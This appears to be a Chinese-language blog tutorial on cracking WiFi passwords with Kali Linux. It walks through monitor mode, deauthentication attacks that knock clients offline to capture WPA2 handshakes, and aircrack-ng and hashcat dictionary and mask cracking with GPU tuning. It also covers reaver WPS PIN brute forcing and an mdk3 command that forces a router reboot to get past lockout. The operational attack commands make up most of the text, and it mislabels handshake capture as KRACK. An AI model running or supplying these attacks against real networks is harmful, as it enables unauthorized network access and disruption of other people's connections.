---
title: Kali Linux破解wifi密码之降龙十八掌
date: 2022-08-09 03:15:58
categories:
- Coding
- Linux
tags:
- Kali
- wifi
id: 15
---

> 本文讲述如何利用 kali 机 aircrack-ng 相关命令，抓取 wifi 连接握手包。然后结合密码字典，破解 wifi 账号密码。
> 参考：[https://leexuan.github.io/2020/06/Kali+Airmon+WiFi%E7%A0%B4%E8%A7%A3/](https://leexuan.github.io/2020/06/Kali+Airmon+WiFi%E7%A0%B4%E8%A7%A3/)


## 一、密码字典

### 1. 常见掩码字符集

```
l | abcdefghijklmnopqrstuvwxyz          纯小写字母
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ          纯大写字母
d | 0123456789                          纯数字
h | 0123456789abcdef                    常见小写字母和数字
H | 0123456789ABCDEF                    常见大写字母和数字
s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~   特殊字符
a | ?l?u?d?s                            键盘上所有可见的字符
b | 0x00 - 0xff                         可能是用来匹配像空格这种密码的
```

<!--more-->

### 2. 简单的例子

```
八位数字密码：?d?d?d?d?d?d?d?d
八位小写字母密码：?l?l?l?l?l?l?l?l
八位未知密码：?a?a?a?a?a?a?a?a
八位数字+小写字母密码：?h?h?h?h?h?h?h?h
前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d
前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H
前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a
6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l
6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h
```

### 3. 密码选择

1. WiFi常见密码字典
2. 8位数字掩码
3. 11位手机号掩码（根据地区提前确定某些位）
4. 8位小写字母掩码
5. 8位小写字母+数字掩码

### 4. 纯数字

```
hashcat -m 2500 -a 3 handshake.hccap ?d?d?d?d?d?d?d?d     // 8位数字
```

## 二、密码破解推荐原则

### 1. 密码破解推荐原则

破解时采取先易后难的原则，建议如下：

（1）利用收集的公开字典进行破解

（2）使用1-8位数字进行破解

（3）使用1-8位小写字母进行破解

（4）使用1-8位大写字母进行破解

（5）使用1-8位混合大小写+数字+特殊字符进行破解

### 2. hashcat破解规则

（1）字典攻击
`-a 0 password.lst`

（2）1到8为数字掩码攻击
`-a 3 --increment --increment-min 1--increment-max 8 ?d?d?d?d?d?d?d?d –O`

?d 代表数字，可以换成小写字母 ?l，大写字母 ?u，特殊字符 ?s，大小写字母+特殊字符 ?a，–O 表示最优化破解模式，可以加该参数，也可以不加该参数。

（3）8为数字攻击
`-a 3 ?d?d?d?d?d?d?d?d`

同理可以根据位数设置为字母大写、小写、特殊字符等模式。

（4）自定义字符

现在纯数字或者纯字母的密码是比较少见的，根据密码专家对泄漏密码的分析，90% 的个人密码是字母和数字的组合，可以是自定义字符了来进行暴力破解，Hashcat 支持4个自定义字符集，分别是 -1 -2 -3 -4。定义时只需要这样 -2 ?l?d ，然后就可以在后面指定 ?2，?2 表示小写字母和数字。这时候要破解一个 8 位混合的小写字母加数字：

`Hashcat.exe -a 3 --force -2 ?l?d hassh值或者hash文件 ?2?2?2?2?2?2?2?2`

例如破解dz小写字母+数字混合8位密码破解：
`Hashcat -m 2611 -a 3 -2 ?l?d dz.hash ?2?2?2?2?2?2?2?2`

（5）字典+掩码暴力破解

Hashcat 还支持一种字典加暴力的破解方法，就是在字典前后再加上暴力的字符序列，比如在字典后面加上 3 为数字，这种密码是很常见的。使用第六种攻击模式：
`a-6 (Hybrid dict + mask)`

如果是在字典前面加则使用第  7  中攻击模式也即 ( a-7 = Hybridmask + dict)，下面对字典文件加数字 123 进行破解：

`H.exe -a 6 ffe1cb31eb084cd7a8dd1228c23617c8 password.lst ?d?d?d`

假如`ffe1cb31eb084cd7a8dd1228c23617c8` 的密码为 password123，则只要 password.lst 包含 123 即可。

（6）掩码+字典暴力破解
`H.exe -a 7 ffe1cb31eb084cd7a8dd1228c23617c8 password.lst ?d?d?d`

假如`ffe1cb31eb084cd7a8dd1228c23617c8`的密码为 123password，则只要password.lst 包含 password 即可。

（7）大小写转换攻击，对 password.lst 中的单词进行大小写转换攻击
`H.exe-a 2 ffe1cb31eb084cd7a8dd1228c23617c8 password.lst`


## 三、破解方法


### 掌法一：aircrack-ng 抓包并破解（Linux Kali）
> 基本功，入门手法

**1. aircrack-ng 简介**

Aircrack-ng 是一个与 802.11 标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP 和 WPA/WPA2-PSK 破解。Aircrack-ng 可以工作在任何支持监听模式的无线网卡上（设备列表请参阅其官方网站）并嗅探 802.11a，802.11b，802.11g 的数据。

**2. 前言**

随着互联网的发展，WiFi 被发明出来，它是一个创建于 IEEE 802.11 标准的无线局域网技术。随着 WiFi 普及，如今 WiFi 几乎存在于所有的集体商户或 个人家庭，在个人家庭有时候会出现忘记密码的时候，这时候就可以用到今天演示的实验了，废话不多说了，开搞~

准备工作： 我使用的环境是虚拟机，物理机是笔记本，根据 kali 官方文档得知，虚拟机 kali 并不能使用物理机自带的无线网卡，所以我们要准备一块 USB 无线网卡，**一定要买兼容kali和免驱的**（来自踩坑者的建议）。如果是物理机上直接装 kali 的狼人，当我没说~

**3. 破解原理**

首先我们看张图：

![](https://img.arctee.cn/one/202207111744822.png)

说明： 图中椭圆为 WiFi 覆盖区域，中间有一个路由器，上面是三台正常连接 WiFi 的设备（虚线说明是无线连接），我们的攻击机是 kali，首先 kal i可以监听他们之间的连接情况，然后向路由器发起攻击，所有连接的设备会掉线，接下来设备会重新进行连接，这时候 kali 可以抓取他们连接时候的握手包，最后对握手包里加密的密文进行爆破即可~（一般 WiFi 密码不会设置太复杂，爆破几率还是很大的）

WPA2 的破解过程主要分为两步：

（1）抓取 WPA2 的四重握手 (4-Way Handshake) 认证包；（2）破解四重握手认证包。

假设被攻击的 Wi-Fi 接入点为 A，接入点中有一个合法的 Wi-Fi 客户端 B，攻击者为 C，则抓取 WPA2 四重握手信息的主要步骤为：

1）攻击者 C 使其Wi-Fi收发设备进入监视模式 (Monitor Mode)，嗅探周围存在的 Wi-Fi 接入点、Wi-Fi 客户端的互相连接信息和 MAC 地址；

2）攻击者 C 将自己的 MAC 地址伪装成 Wi-Fi 接入点 A 的 MAC 信息，并向合法客户端B发出断线信息；

3）合法客户端 B 误以为自己断线，重新和接入点 A 进行四重握手认证流程；

4）攻击者 C 截取四重握手认证包。

这部分内容其实叫做 KRACK(Key Reinstallation Attacks, 密钥重载攻击)，于 2017 年由比利时鲁汶大学的研究者们提出。
对这部分内容感兴趣的读者们可以在[【他们的主页】](https://www.krackattacks.com/)找到更详细的描述。

破解四重握手认证包的主要步骤为：

1）获取一个质量较高的密码字典，最理想的情况是该字典包含被攻击的四重握手包密码，其次理想的情况是被攻击的密码大部分字符出现在字典中，剩下字符则是规则简单的序列；

2）使用 GPU 加速 hash 碰撞，进行密码破解。

对这部分内容感兴趣的读者可以在著名的 hash 碰撞工具[【hashcat的主页】](https://hashcat.net/hashcat/)找到更详细的描述。这篇博文也会使用 hashcat 作为 hash 碰撞工具。

**4. 实验过程**

实验环境搭建： 我这里使用手机开热点作为攻击的目标（路由器），使用我的物理机笔记本连接热点（正常连接设备），开启虚拟机kali并把有线连接关闭（尽可能防止实验干扰），插入我们准备的无线网卡，这里虚拟机会提示连接到物理机还是虚拟机，选择虚拟机 kali 即可~

整个 wifi 破解过程，包括三个步骤：

（1） WIFI 信息收集
（2） WIFI 连接握手包抓取
（3） 利用密码字典暴力跑包

**Step1：首先在kali中打开终端，使用“ifconfig”命令查看网卡信息**

```
ifconfig
或者
iwconfig
```

**Step2：开启网卡的监听模式**

```
airmon-ng start wlan0		//指定网卡名字wlan0，开启监听模式
```

**Step3：别的程序在占用网卡，可以使用标红处命令清理**

```
airmon-ng check kill  //清理掉占用网卡的程序，使airmon-ng工具可支配网卡
```

**Step4：检查是否成功开启了监听模式**

```
ifconfig		//wlan0变成了wlan0mon，这就是开启侦听模式的标志
```

**Step5：扫描发现一下附近的WiFi**

```
airodump-ng wlan0mon  //指定监听模式下的网卡名字
```
![](https://img.arctee.cn/one/202207111745445.png)

一般信号最强的在第一行，这时候可以 ctrl+c 结束一下

**Step6：只对我们的目标进行侦听抓包，不理会其他WiFi**

```
airodump-ng --bssid B4:CD:27:DF:BF:AE -c 1 --write wifi1 wlan0mon
//--bssid参数指定目标的MAC地址，-c参数指定信道数，也就是CH那一列，--write参数指定抓到的包存放文件名字，wlan0mon指定网卡名字
```

**Step7：让这个终端放着，重新打开一个终端，对WiFi热点攻击，使所有设备断开连接**

```
aireplay-ng -0 20 -a B4:CD:27:DF:BF:AE wlan0mon  //-0参数指定发送攻击数据包的个数，-a参数指定攻击设备的MAC地址，wlan0mon指定无线网卡名字
```

![](https://img.arctee.cn/one/202207102316070.png)

**第一个终端上**如果出现标红区域这一条数据，就说明已经抓到了设备与热点之间的握手包并存放在了此目录下，如果没有显示，可以按上一步多发送几次，再来查看

**Step8：接下来我们进行爆破，首先要准备一个字典**

```
aircrack-ng -w pass.txt wifi1-01.cap  //-w参数指定密码字典，wifi1-01.cap为握手包
或者
aircrack-ng- a2 -b B4:CD:27:DF:BF:AE -w pass.txt wifi1-01.cap  		//-a2代表WPA的握手包 -b指定要破解的wifi BSSID  -w指定字典文件
```

![](https://img.arctee.cn/one/202207111746485.png)

这时候会惊喜的发现密码已经爆破完毕了，速度还是挺快的，使用密码即可登录

**Step9：无线网卡退出监听模式**

```
airmon-ng stop wlan0mon
```


### 掌法二：aircrack-ng 抓包 + hashcat 破解（Kail Linux）

> [Hashcat的使用手册总结](https://xz.aliyun.com/t/4008#toc-2)
> 优势：
> 速度提高数倍
> 可以用gpu破解

首先要把 **airodump** 抓取的**cap文件转化为hccap**格式， 可以在线转换， 在线转换的地址为：[https://hashcat.net/cap2hccap/](https://hashcat.net/cap2hccap/)， 也可以用**aircrack-ng**转换

```
aircrack-ng <out.cap> -J <out.hccap>
```

或者使用 hashcat 命令，第一个参数： -m 2500 为破解的模式为 WPA/PSK 方式 ，第二个参数： hccap 格式的文件是刚刚转化好的文件， 第三个参数： **dics.txt**为字典文件 :

```
hashcat -m 2500 out.hccap.hccap  dics.txt -o results
```

破解的进度通过按键盘上的 **s** 键即可查看：
![](https://img.arctee.cn/one/202207102316782.png)

1. 破解纯数字密码
```
hashcat -m 2500 -a 3 handshake.hccap ?d?d?d?d?d?d?d?d		//?d?d?d?d?d?d?d?d代表8为数字
```

2. 使用 crunch 生成字典

kali 系统中，通过 crunch 生成字典， 要生成 8 位纯数字的字典，使用以下命令，
```
crunch 8 8  0123456789 -o dic.txt
```

8 8 代表最小位数为8，最大位数也为8， 0123456789为字典中的数字 , -o dic.txt 说明要把字典生成到 dic.txt， 生成的纯数字字典有 900M


### 掌法三：aircrack-ng 抓包 + hashcat 破解（Windows）
> 可参考：[https://zhuanlan.zhihu.com/p/35661801](https://zhuanlan.zhihu.com/p/35661801)

抓包步骤同上，只是这次是借助主机 windows 来破解

实际操作时，先在每台机器上测试下性能，选择最快的机器跑包：

```
hashcat64.exe -I  //查看显卡支持情况
hashcat.exe -m 2500 -b --force  //使用独显测试破解
hashcat64.exe -m 2500 --force -d1,2 -b  //忽略警告使用独显和集显一起测试破解

hashcat64.exe --restore  //如果上一次没有跑完可以命令继续跑包

```

```
hashcat.exe -m 2500 -a 0 -D 2 -O -w 3 qian.hccapx combined_dictionary.txt --show  //破解成功展示密码或者用来查看密码
hashcat.exe -m 2500 -a 0 -D 2 qian.hccapx rockyou.txt rockyou1.txt ...

-w 3 （让gpu 占用率更高，这个会使屏幕刷新会变慢，但破解速度会更高）
```

**Options** //选项参数

| 参数 | 类型 | 介绍 | 例子 |
| --- | --- | --- | --- |
| -m | Num | Hash类型 | -m 2500= WPA/WPA2，默认指md5 |
| -a | Num | 攻击模式 | -a 0：字典攻击，-a 1： 组合攻击；-a 3：掩码攻击 |
| -o | File | 为恢复Hash值定义输出文件 | -o outfile.txt //默认输出到output |
| -D | Str | 选择用CPU还是GPU来破解 | -D 2 //2默认gpu，1为cpu |

攻击模式：

0 = Straight （字典破解）
1 = Combination （组合破解）
2 = Toggle-Case （大小写转换）
3 = Brute-force（掩码暴力破解）
4 = Permutation（序列破解）
5 = Table-Lookup（查表破解）
6 = Hybrid dict + mask 字典加掩码破解
7 = Hybrid mask + dict 掩码+字典破解
8 = Prince（王子破解）


**常见问题**

```
* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
           
# 参考 https://hashcat.net/q/timeoutpatch 新建 wddm_timeout_patch.reg 文件，内容如下，保存后双击运行导入注册表。
```

```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers]
"TdrLevel"=dword:00000000
```

（1） 对于破解过的hash值，用`hashcat64.exe hash --show`查看结果

（2） 所有的hash破解结果都在hashcat.potfile文件中

（3）如果破解的时间太长，可以按s键可以查看破解的状态，p键暂停，r键继续破解，q键退出破解

（4） 在使用GPU模式进行破解时，可以使用-O参数自动进行优化

（5）在实际破解中的建议，如果我们盲目的去破解，会占用我们大量的时间和资源


```
1.首先走一遍常用的弱口令字典
2.组合密码，如：zhang1999，用姓氏和出生年组合，当然也可以用其它的组合，这里举个例子而已
3.把常用的掩码组合整理起来放在masks中的.hcmask文件中，然后让它自动加载破解
4.如果实在不行，你可以尝试低位数的所有组合去跑，不过不建议太高位数的组合去破解，因为如果对方设置的密码很复杂的话，到头来你密码没有破解到，却浪费了大量的时间和资源，得不偿失
```

上面的是比较理想的情况，即密码就在字典中，但是很多时候密码可能是字典中的字符串加自定义字符串的形式，这个时候就要用到 hashcat 的混合模式。下面举一个混合模式的例子：

```
hashcat.exe -a 6 -m 2500 [hccapx file] [dictionary file] ?d?d?d --self-test-disable
```

其中 -a 6 表示混合模式，?d?d?d 表示末尾添加 3 个任意数字。hashcat 的字符集设定如下所示：

```
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?h = 0123456789abcdef
?H = 0123456789ABCDEF
?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
?a = ?l?u?d?s
?b = 0x00 – 0xff
```

（6） HashCat 参数优化

考虑到 hashcat 的破解速度以及资源的分配，我们可以对一些参数进行配置

![](https://img.arctee.cn/one/202207102323103.png)

1）Workload tuning 负载调优

该参数支持的值有1,8,40,80,160
```
--kernel-accel 160 可以让GPU发挥最大性能。
```

2） Gpu loops 负载微调

该参数支持的值的范围是8-1024（有些算法只支持到1000）。
```
--kernel-loops 1024 可以让GPU发挥最大性能。
```

3） Segment size 字典缓存大小

该参数是设置内存缓存的大小，作用是将字典放入内存缓存以加快字典破解速度，默认为 32MB，可以根据自身内存情况进行设置，当然是越大越块了。
```
--segment-size 512 可以提高大字典破解的速度。
```


### 掌法四：wifite 自动抓包输出 + hashcat 破解（Windows）

**（推荐此方法）**


### 掌法五：wifite 自动抓包输出 + hashcat 破解（Linux GPU）

linux安装GPU驱动，有点危险，弄不好就会翻车。
> [https://www.kali.org/docs/general-use/install-nvidia-drivers-on-kali-linux/](https://www.kali.org/docs/general-use/install-nvidia-drivers-on-kali-linux/)

但是我们可以直接安装 **CUDA toolkit**

```
apt install -y ocl-icd-libopencl1 nvidia-driver nvidia-cuda-toolkit
```

一键安装，绝不翻车。安装好了过后，重启一下。

`nvidia-smi`

`hashcat -I`

即可查看GPU信息

`hashcat -b`

进行算法测试，可以查看自己GPU的跑包的速度


### 掌法六：wifite 自动抓包输出 + reaver 破解（开启了WPS）

```
reaver -i wlan0mon -b D8:15:0D:D6:13:92 -S -d9 -t9 -vv
```

破解完成之后，查看并记录下 PIN 码和密码

获取到 PIN 码 后，以后即便路由器更换了密码，我们也可以很迅速地通过 PIN 码重新获得新密码。举例：

```
 reaver  -i  wlan0mon -b  xx:xx:xx:xx:xx:xx  -p 12345670
```

【注意事项】（此处转载于[https://blog.csdn.net/Qidi_Huang/article/details/63698574](https://blog.csdn.net/Qidi_Huang/article/details/63698574)）

（1）如果在执行 reaver 命令后看到有 WARNING: Failed to associate with xx:xx:xx:xx:xx:xx 这样的提示信息，那么应该是你选择了一个不具备或关闭了 WPS 功能的路由器。这种情况下就执行wash 命令并重新选择一个路由器吧。

（2）如果在执行 reaver 命令后看到有 warning detected ap rate limiting waiting 60 seconds before re-checking 这样的提示信息，这表示目标路由器开启了防 PIN破解 功能。因为我们是穷举 PIN码 进行破解的，当连续使用超过某个次数的 PIN码 后，路由器会暂时锁定 WPS 功能一段时间。这种情况下要么我们耐心等待其恢复 WPS 功能，要么执行 mdk3 wlan0mon a -a xx:xx:xx:xx:xx:xx （这是上面的目标AP的MAC地址）命令让路由器主动重启或被动重启以恢复 WPS 功能。


